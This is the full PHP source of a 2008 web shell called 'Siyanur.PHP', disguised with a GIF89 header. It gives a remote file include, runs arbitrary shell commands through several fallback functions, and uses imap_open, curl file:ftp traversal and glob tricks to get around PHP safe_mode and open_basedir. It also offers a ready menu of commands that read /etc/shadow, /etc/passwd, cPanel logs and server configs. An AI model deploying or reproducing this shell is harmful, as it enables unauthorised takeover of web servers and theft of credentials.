GIF89;a
<img src=http://imhatimi.org/Siyanur2.jpg>
<?php
/*
************************************************************************
*                      Siyanur.PHP safe_mode = on ? X Bypass Full      *
************************************************************************
*                                                                      *
*          /      \                                                    *
*       \  \  ,,  /  /                                                 *
*        '-.`\()/`.-'                                                  *
*       .--_'(  )'_--.            * (C) 2008 Www.SpyHackerZ.coM *      *
*      / /` /`""`\ `\ \                                                *
*       |  |  ><  |  |              Public:  Ekim  26 , 2008           *
*       \  \      /  /              Mailto: mectruy@hotmail.com        *
*           '.__.'                                                     *
*                                                                      *
************************************************************************
*Coder: MecTruy http://www.mectruy.wordpress.com
*Linux version: 5.2.5 // 5.2.6 Bypassed
*Http:// www.imhatimi.org // www.spyhackerz.com // www.mectruy.blogspot.com 
*Siyanur.php Shell
*/
#Siyanur.PHP 5.2.5 ~ 5.2.6 Safe_mode Bypass Full Edition Priv8
#Komut cmd eklendi
#Dizin okuma eklendi
#Komut listesi eklendi
if ($_GET['x']) { include($_GET['x']); }
if ($_POST['cxc']=='down') {
header("Content-disposition: filename=decode.txt");
header("Content-type: application/octetstream");
header("Pragma: no-cache");
header("Expires: 0");
error_reporting(0);
echo base64_decode($_POST['xCod']);
exit;
}

?>
<html>

<head>
<title>Siyanur.PHP 5.2.6 / 5.2.6 safe_mode Bypass ( Full Edition - Priv8 )  - Powered By MecTruy - www.imhatimi.org</title>
</head>

<body bgcolor="#000000">
<font color=FF8000>
<font face=verdana>
<?php
if (!extension_loaded(curl)){die("Curl yoksa , Bypass senin neyine a.q");}

//
//phpinfo
if (empty($_POST['phpinfo'] )) {
	}else{
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo()";
	exit;
}
//
// encode/decode
//
// uname
function getsystem()
{return php_uname('s')." ".php_uname('r')." ".php_uname('v');}; 
//
//safemode
function safe_mode(){
if(!$safe_mode && strpos(ex("echo abch0ld"),"h0ld")!=3){$_SESSION['safe_mode'] = 1;return "<b><font color=#800000 face=Verdana>ON</font></b>";}else{   $_SESSION['safe_mode'] = 0;return "<font color=#008000><b>OFF</b></font>";}
};function ex($in){
$out = '';
if(function_exists('exec')){exec($in,$out);$out = join("\n",$out);}elseif(function_exists('passthru')){ob_start();passthru($in);$out = ob_get_contents();ob_end_clean();}
elseif(function_exists('system')){ob_start();system($in);$out = ob_get_contents();ob_end_clean();}
elseif(function_exists('shell_exec')){$out = shell_exec($in);}
elseif(is_resource($f = popen($in,"r"))){$out = "";while(!@feof($f)) { $out .= fread($f,1024);}
pclose($f);}
return $out;}
//
?>



  <tr>
    <td width="100%" height="43">

    <table border="1" cellpadding="0" cellspacing="0" bordercolor="#545454" width="100%" id="AutoNumber2" bgcolor="#424242" style="border-collapse: collapse">
      <tr>
        <td width="100%" bgcolor="#000000">
</td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Kernel :</font> <?php echo @php_uname();?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Server :</font> <?php echo $_SERVER['SERVER_NAME'];?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>PHP :</font> <?php echo phpversion();?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Dic :</font> <?php echo getcwd();?></td>
      </tr>
      <tr>


        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Safe_Mode :</font> <?php echo safe_mode();?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Software :</font> <?php echo getenv("SERVER_SOFTWARE");?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>iD :</font> <?php echo system(id);?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>C0nnect ? :</font> <?php echo ($_SERVER['HTTP_CONNECTION']);?>   <font color=ffffff>Port :</font> <?php echo (":".$_SERVER["SERVER_PORT"]);?>  </td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Your Agent :</font> <?php echo ($_SERVER['HTTP_USER_AGENT']);?>   <font color=ffffff>Your ip info :</font> <?php echo ($_SERVER['REMOTE_ADDR']);?>   MySQL: </td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FF0000; font-size: 8pt; font-weight: bold" dir="ltr"><font color=ffffff>Protokol :</font> <?php echo ($_SERVER["SERVER_PROTOCOL"]);?>   <font color=ffffff>Charset :</font> <?php echo ($_SERVER['HTTP_ACCEPT_CHARSET']);?>   <font color=ffffff>Encoding :</font> <?php echo ($_SERVER['HTTP_ACCEPT_ENCODING']);?>   <font color=ffffff>Lang :</font> <?php echo ($_SERVER['HTTP_ACCEPT_LANGUAGE']);?></td>
      </tr>


      <tr>

      </tr>
    </table>

    </td>
  </tr>

 <form action="" method="post">
<select name="switch">
<option selected="selected" value="file">Hedef oku</option>
<option value="dir">Dizin oku</option>
</select>
<input type="text" size="60" name="string">
<input type="submit" value="Bypassed">
</form>

<?php
$string = !empty($_POST['string']) ? $_POST['string'] : 0;
$switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;

if ($string && $switch == "file") {
$stream = imap_open($string, "", "");
if ($stream == FALSE)
die("Can't open imap stream");

$str = imap_body($stream, 1);
if (!empty($str))
echo "<pre>".$str."</pre>";
imap_close($stream);
} elseif ($string && $switch == "dir") {
$stream = imap_open("/etc/passwd", "", "");
if ($stream == FALSE)
die("Can't open imap stream");

$string = explode("|",$string);
if (count($string) > 1)
$dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
else
$dir_list = imap_list($stream, trim($string[0]), "*");
echo "<pre>";
for ($i = 0; $i < count($dir_list); $i++)
echo "$dir_list[$i]\n";
echo "</pre>";
imap_close($stream);
}
?>


<?
function safeshell($komut) 
{ 
ini_restore("safe_mode");
ini_restore("open_basedir");
 $res = ''; 
 if (!empty($komut)) 
 { 
if(function_exists('exec')) 
{ 
 @exec($komut,$res); 
 $res = join("\n",$res); 
} 
elseif(function_exists('shell_exec')) 
{ 
 $res = @shell_exec($komut); 
} 
elseif(function_exists('system')) 
{ 
 @ob_start(); 
 @system($komut); 
 $res = @ob_get_contents(); 
 @ob_end_clean(); 
} 
elseif(function_exists('passthru')) 
{ 
 @ob_start(); 
 @passthru($komut); 
 $res = @ob_get_contents(); 
 @ob_end_clean(); 
} 
elseif(@is_resource($f = @popen($komut,"r"))) 
{ 
$res = ""; 
while(!@feof($f)) { $res .= @fread($f,1024); } 
@pclose($f); 
} 
 } 
 return $res; 
}

print_r('
<pre>
<form method="POST" action="">
<b><font color=red>Liste:</font><select size="1" name="g0t">
<option value=""></option>
<option value="lsattr -a">Dizin</option>
<option value="cd /etc/valiases ;ls -lia">g0t safe ?</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/vfilters">/etc/vfilters</option>
<option value="cat /etc/vdomainaliases">/etc/vdomainaliases</option>
<option value="cat /etc/shadow">/etc/shadow</option>
<option value="cat /etc/group">/etc/group</option>
<option value="cat /usr/lib/security/mkuser.default">mkuser.default</option>
<option value="cd /etc/passwd ;ls -lia">g0t Dir;</option>
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="find . -perm -2 -type f -print">777 Files find</option>
<option value="cat /etc/issue.net">/etc/issue.net</option>
<option value="cat /etc/valiases">/etc/valiases</option>
<option value="cat /etc/userdomains">/etc/userdomains</option>
<option value="/usr/local/apache/conf/httpd.conf">/usr/local/apache/conf/httpd.conf</option>
<option value="netstat -an | grep -i listen">Open port</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" value="ilet">  <form method="POST" action=""><b><font color=red>Komut :</font></b><input name="r00t" type="text"><input value="istek" type="submit">
</form>

</pre>
');
ini_restore("safe_mode");
ini_restore("open_basedir");
if($_POST[r00t]!= "") { $g0t=safeshell($_POST[r00t]); }
if($_POST[g0t]!= "") { $g0tr00t=safeshell($_POST[g0t]); }
$uid=safeshell('id');
$server=safeshell('uname -a');
echo "<pre><h4>";
echo "<b><font color=red>Komut sonucu:</font></b><br>"; 
if($_POST["r00t"]!= "") { echo $g0t; }
if($_POST["g0t"]!= "") { echo $g0tr00t; }
echo "</h4></pre>";
?>

<? 
  // Safe mode breaker 
  // data: 28.10.2008 

  error_reporting(E_WARNING); 
  ini_set("display_errors", 1); 

  echo "<head><title>".getcwd()."</title></head>"; 

  echo "<form method=POST>"; 
  echo "<div style='float: left'>Dizin Oku: <input type=text name=root value='{$_POST['root']}'></div>"; 
  echo "<input type=submit value='--&raquo;'></form>"; 



  // break ~censored~ safe-mode ! 
?>

  <tr>
    <td width="100%" height="1"><?php
if (empty($_POST['z3r'])){
	
	echo '<form method="POST">';
	echo '<input type="text" name="z3r" size="50" value="/home/hedefuser/public_html/index.php">';
	echo '<input type="submit" value="Encode">';
	echo '</form>';
}else{
	$b4se64 =$_POST['z3r'];
	$heno =base64_encode($b4se64);
	echo '<p align="center">';
	echo '<textarea method="POST" rows="1" cols="80" wrar="off">';
	print $heno;
	echo '</textarea>';
}
	echo '<form method="post" /><input type="text" name="cz" size="50" value="L2V0Yy9wYXNzd2Q=" /><input type="submit" value="OK !!" /><select name=dec><option value=show>Oku</option><option value=decode>Komut</option></select></form>';

	if( !empty($_POST['cz']) )
		if ($dec=='decode'){echo "<form name=form method=POST>";}
		echo "<p align=left><textarea method='POST' name='xCod' cols='60' rows='25' wrar='off' >";
	
			$ss=$_POST['cz'];
			$file = base64_decode($ss);
		
		
					if((curl_exec(curl_init("file:ftp://../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../".$file))) aNd emptY($file))
			
				if ($_POST['dec']=='decode'){echo base64_encode($_POST['xCod']);}


echo "</textarea></p>";

?></td>
  </tr>
  <tr>
    <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13"><?php if ($dec=='decode'){ echo "<p align=center><input type=hidden name=cxc value='down'><input type=submit name=submit value='DownLoad'></p></form>"; } ?></td>
  </tr>

<?
$root = "/"; 

  if($_POST['root']) $root = $_POST['root']; 

  if (!ini_get('safe_mode')) die("Safe-mode is OFF."); 

  $c = 0; $D = array(); 
  set_error_handler("eh"); 

  $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; 

  for($i=0; $i < strlen($chars); $i++){ 
  $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}"; 

  $prevD = $D[count($D)-1]; 
  glob($path."*"); 

        if($D[count($D)-1] != $prevD){ 

        for($j=0; $j < strlen($chars); $j++){ 

           $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}"; 

           $prevD2 = $D[count($D)-1]; 
           glob($path."*"); 

              if($D[count($D)-1] != $prevD2){ 


                 for($p=0; $p < strlen($chars); $p++){ 

                 $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}"; 

                 $prevD3 = $D[count($D)-1]; 
                 glob($path."*"); 

                    if($D[count($D)-1] != $prevD3){ 


                       for($r=0; $r < strlen($chars); $r++){ 

                       $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}"; 
                       glob($path."*"); 

                       } 

                    }        

                 } 

              }        
    
        }    

        } 

  } 

  $D = array_unique($D); 

  echo "<xmp>"; 
  foreach($D as $item) echo "{$item}\n"; 
  echo "</xmp>"; 




  function eh($errno, $errstr, $errfile, $errline){ 

     global $D, $c, $i; 
     preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o); 
     if($o){ $D[$c] = $o[2]; $c++;} 

  } 

?>
